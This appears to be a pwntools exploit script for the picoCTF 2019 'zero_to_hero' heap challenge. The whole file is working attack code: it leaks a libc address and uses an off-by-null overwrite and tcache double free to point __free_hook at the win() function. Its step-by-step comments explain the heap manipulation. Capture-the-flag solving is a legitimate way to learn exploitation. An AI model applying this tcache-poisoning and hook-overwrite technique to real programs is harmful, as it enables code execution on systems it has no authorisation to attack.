#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --port 49928 zero_to_hero
from pwn import *
import time
import re

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('zero_to_hero')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 49928)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Standard helper functions
def wait():
    time.sleep(0.15)
def flush():
    return io.recv(4096)

def create(s, l):
    io.sendline('1')
    io.sendline(str(l))
    io.sendline(s)
    wait()

def remove(n):
    io.sendline('2')
    io.sendline(str(n))
    wait()

# win_addr = exe.symbols['win']

io = start()

io.sendlineafter("So, you want to be a hero?", "yes")
wait()

io.recvline()
io.recvline() # receive "Really? Being a hero is hard."
io.recvline() # receive "Fine. I see I can't convince you otherwise."
leak = io.recvline().split('this: ')[1][2:] # get the leaked libc system address
SYSTEM = int(leak, 16)
LIBC_BASE = SYSTEM - 0x2C550
log.info("Leaked Libc: {}".format(hex(LIBC_BASE)))

MALLOC_HOOK = LIBC_BASE + 0x72380
# at 0x1e3ef8 in file
FREE_HOOK = LIBC_BASE + 0x1C0B28

log.info("`malloc` chunk A, size 0x30")
create("AAAA", 40)
log.info("`malloc` chunk B, size 0x110")
create("BBBB", 264)

log.info("`free` chunk B")
remove(1)

log.info("`free` chunk A, so we can write to it and overflow it next")
remove(0)
log.info("`malloc` (for the second time) chunk A, size 0x30; overwrite size of chunk B with null byte")
create("a"*40, 40)

log.info("`free` chunk B again (double `free` conditions met)")
remove(1)

io.recv(4096)

# Overwrite the forward address of chunk B with the address of `FREE_HOOK`.
log.info("`malloc` chunk of size 0x100 and overwrite the forward address to `__free_hook`")
create(p64(FREE_HOOK), 248)

# After being double-freed, chunk B cannot be removed from the 0x100 list, but
# it can be removed from the 0x110 list since it was only freed once in that list.
# We create a chunk of the same size as chunk B, thus returning to us chunk B from
# tcache. Now the pointer to the next block in the 0x110 list points to the forward
# address of block B, which we overwrote to `FREE_HOOK`. The block in the 0x100 list
# refers to the same memory location as the block in the 0x110 list.
log.info("`malloc` the same (as above) chunk but from the list for size 0x110, thus removing it from the list and leaving the next chunk pointer pointing at `__free_hook`")
create("0", 264)

# Now that the next block points to our overwritten memory location, we `malloc` it.
# `malloc` sees our request for a block of memory with size 0x110 and returns the pointer
# to the next block, which we overwrote to `FREE_HOOK`. `malloc` then asks what value we
# want to store in this "block of memory" (which is actually `FREE_HOOK`). We tell is to
# store the address of `win()`. We have successfully written over an address of our choosing
# with an arbitrary address. `malloc` believes we simply asked for a block of memory, it gave
# us one, and then we stored our data in it. You can think of this as `malloc` being oblivious
# to our attack.
log.info("Use `malloc` to write the address of `win()` to `__free_hook`")
# 0x400a02 is the location of win()
create(p64(0x400a02), 264)

# We overwrote the `__free_hook` pointer to the `win()` function. So, now we actually have to
# use our overwritten memory by calling `free()`, which redirects its actions to whatever
# function `__free_hook` happens to point to.
log.info("Execute the `win()` function at 0x400a02")
remove(0)

# io.recvuntil("\n") # remove the newline from the flag
output = io.recvuntil("}")
flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
log.success(flag)

# io.interactive()
